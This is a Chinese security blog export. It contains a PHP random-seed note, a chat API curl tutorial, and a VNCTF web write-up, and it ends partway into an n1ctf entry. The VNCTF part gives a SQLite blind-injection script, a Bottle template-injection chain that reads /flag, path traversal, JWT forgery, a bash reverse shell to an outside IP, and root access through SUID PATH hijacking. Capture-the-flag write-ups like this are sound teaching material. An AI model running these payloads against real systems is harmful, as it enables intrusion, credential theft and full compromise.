class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$response</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dict</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$j</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dict</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$j</span>]) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; 0 &#x27;</span> . (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27; &#x27;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-string">&quot;输入&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>而且数据可以按次数推的，如果运行了两次随机数</p><p>假设生成了12位的随机字符串，生成了两次，我们不知道第一次的，但是知道第二次的</p><p>我们可以再第二次处理后的字节前加上12组<code>0 0 0 0</code></p><p>也可以将种子爆破出来</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php伪随机数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API</title>
    <link href="/2025/02/15/API%E4%B8%8Edeepseek/"/>
    <url>/2025/02/15/API%E4%B8%8Edeepseek/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是API"><a href="#什么是API" class="headerlink" title="什么是API"></a>什么是API</h2><p>AI的API基本都遵循openai的最早发布的API格式(以deepseek为例)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions <br></code></pre></td></tr></table></figure><blockquote><p>请求头部：你要请求的服务提供商</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>请求格式：设置为json格式   ps:API都是POST传参</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> <br></code></pre></td></tr></table></figure><blockquote><p>你的API密钥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>发送的数据：</p><p>model：模型名称；以官方为准</p><p>messages：消息主体,以字典数组格式。role：用户    content：消息</p></blockquote><p>但是我的deekseek没钱了，用NAIDIA做演示一样的</p><p>发送</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://integrate.api.nvidia.com/v1/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer API-key&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-ai/deepseek-r1&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ae53374d84f74e1baf5e47f70108fd24&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;chat.completion&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;created&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1739601068</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deepseek-ai/deepseek-r1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;choices&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;assistant&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? 😊&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tool_calls&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logprobs&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;finish_reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stop&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;matched_stop&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;usage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;total_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">21</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prompt_tokens_details&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? 😊&quot;,&quot;tool_calls&quot;:null&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF-web</title>
    <link href="/2025/02/11/VNCTF-web/"/>
    <url>/2025/02/11/VNCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h1><p> 输入<code>1&#39;</code>回显</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" alt="image-20250214130506725"></p><p>但是输入<code>1&#39;&#39;</code>两个单引号</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" alt="image-20250214130543617"></p><p>正常回显，说明存在sql注入</p><p>先fuzz一下</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" alt="image-20250214131102161"></p><p>过滤了一点而且对大小写敏感，猜测是<code>sqlite</code>(也可能是正则），打时间盲注，那他过滤sleep干嘛，迷惑我们吗</p><p>既然猜测是<code>sqlite</code>那就使用<code>randombolb</code>函数试试</p><p>空格使用<code>/**/</code>过滤</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">payload = &quot;&#x27;OR/**/(case/**/when(substr(sqlite_version(),1,1)&lt;&#x27;310&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--&quot;<br></code></pre></td></tr></table></figure><p>大佬的脚本(二分法)                                                                          </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:47163/login&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># payload = &#x27;sqlite_version()&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/from/**/sqlite_master&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\&#x27;table\&#x27;/**/AND/**/name=\&#x27;users\&#x27;;&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(username)/**/from/**/users&#x27;</span><br>        payload = <span class="hljs-string">&#x27;select/**/group_concat(password)/**/from/**/users&#x27;</span><br>        username = <span class="hljs-string">&#x27;baozongwi&#x27;</span><br>        char = <span class="hljs-built_in">chr</span>(mid)<br>        password = <span class="hljs-string">&quot;&#x27;or/**/(case/**/when(substr((&#123;&#125;),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;</span>.<span class="hljs-built_in">format</span>(<br>            payload, i, char)<br>        json = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: username,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url=url, json=json, timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">except</span> Exception:<br>            head = mid + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]result: <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br><br><br></code></pre></td></tr></table></figure><h1 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a><strong>学生姓名登记系统</strong></h1><p>写了一下这个题目，起初以为只是简单的ssti，但是发下是bottle模板，而且还限制了长度</p><p>题目提示要多行，刚开始想的是<code>&#123;%set%&#125;</code>,不知道是botlle模板，不知道没有这个</p><p><a href="https://www.osgeo.cn/bottle/stpl.html">bottle开发文档</a></p><p>有一个新的知识 <code>:=</code>点再python3.8以后就有了这个运算符</p><p> Bottle 的模板引擎依赖于 Python 的表达式求值，但它并不是一个完整的 Python 解释器。在模板中，只有可直接求值的表达式才能通过 <code>&#123;&#123;...&#125;&#125;</code> 语法嵌入。因此，<code>a=5</code> 这样的赋值语法会导致语法错误，因为赋值本身并不是一个返回值的表达式，而是一个操作</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-number">5</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" alt="image-20250215171504250"></p><p>那么就可以写了</p><p>payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">b:</span>=a.__class__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c:</span>=b.__base__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d:</span>=c.__subclasses__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">e:</span>=d()[156]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">f:</span>=e.__init__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g:</span>=f.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">z:</span>=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">h:</span>=g[z]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">i:</span>=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x:</span>=i(<span class="hljs-name">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">y:</span>=x.read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" alt="image-20250215171805552"></p><h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>先看源码，发现再download路由存在目录穿越，没对输入进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">func Download(c *gin.Context) &#123;<br>filename := c.DefaultQuery(<span class="hljs-string">&quot;filename&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, nil, <span class="hljs-string">&quot;Filename is required&quot;</span>)<br>&#125;<br>basepath := <span class="hljs-string">&quot;./uploads&quot;</span><br>filepath, _ := url.JoinPath(basepath, filename)<br><span class="hljs-keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">404</span>, nil, <span class="hljs-string">&quot;File not found&quot;</span>)<br>&#125;<br>c.Header(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span>+filename)<br>c.File(filepath)<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们传<code>filename=../config/key.go</code>拿到key的一部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> config<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Key</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;r00t32l&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Year</span><span class="hljs-params">()</span></span> <span class="hljs-type">int64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2025</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在看他的key的生成逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateKey</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>rand.Seed(config.Year())<br>randomNumber := rand.Intn(<span class="hljs-number">1000</span>)<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())<br><span class="hljs-keyword">return</span> key<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们就可以生成key</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" alt="image-20250215172821196"></p><p>拿到key那就可以进行jwt伪造生成admin的token</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN<span class="hljs-number">1</span>YiI<span class="hljs-number">6</span>InVzZXIgdG<span class="hljs-number">9</span>rZW<span class="hljs-number">4</span>iLCJleHAiOjE<span class="hljs-number">3</span>Mzk<span class="hljs-number">2</span>OTc<span class="hljs-number">3</span>NjQsImlhdCI<span class="hljs-number">6</span>MTczOTYxMTM<span class="hljs-number">2</span>NH<span class="hljs-number">0</span>.ARUWYZnXAJTR<span class="hljs-number">0</span>QmR-Vn<span class="hljs-number">4e49</span>HEPI<span class="hljs-number">1</span>o<span class="hljs-number">4</span>CpSvrxP<span class="hljs-number">3</span>NBVgM<br></code></pre></td></tr></table></figure><p>那我们就可以进行rce了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>    re := regexp.MustCompile(importRegex)<br>    matches := re.FindStringSubmatch(code)<br>    imports := matches[<span class="hljs-number">0</span>]<br>    log.Println(imports)<br>    <span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>不让os&#x2F;exec，我们用syscall</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    syscall.Exec(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>&#125;, []<span class="hljs-type">string</span>&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">8.138.181.58</span>/<span class="hljs-number">32771 0</span>&gt;&amp;<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" alt="image-20250215174943757"></p><p>假的，看看有没有suid提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/usr/bin/chsh<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/su</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/sudo</span><br><span class="hljs-regexp">/.../</span>Cat<br></code></pre></td></tr></table></figure><p>有个&#x2F;…&#x2F;Cat运行时，其实是运行了<code>system(&#39;cat /flag&#39;)</code>那我们尝试环境变量劫持cat命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash&#x27;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> +x /tmp/cat <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>/.../Cat<br></code></pre></td></tr></table></figure><p>发现我们的权限变成root</p><p>再拿flag，不能用cat了</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" alt="image-20250215175852729"></p>]]></content>
    
    
    <categories>
      
      <category>比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlite注入</tag>
      
      <tag>linux提权</tag>
      
      <tag>时间盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf</title>
    <link href="/2025/02/09/n1ctf/"/>
    <url>/2025/02/09/n1ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="n1ctf"><a href="#n1ctf" class="headerlink" title="n1ctf"></a>n1ctf</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>n1战队的招新赛，题目都非常有深度，平时的知识点但是很深入，写之前还抱有一丝进入战队的幻想，拼尽全力无法战胜</p><p>全是大佬</p><p><strong>写出4题其中<code>Easydb</code>是在<code>23：08</code>写出提交</strong></p><h2 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h2><p>写了很久，一直以为是上传文件，有任意文件读取，但是那个权限实在没法绕</p><p>后面突然想起这是LFI那是不是可以利用去年那个cve，结果就成了 ^_^</p><p><a href="https://xz.aliyun.com/news/14127">LFI到RCE</a>感谢<a href="https://blog.kengwang.com.cn/archives/640/?replyTo=535">kengwang</a>师傅让我了解</p><p>现在分析一下我的思路</p><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 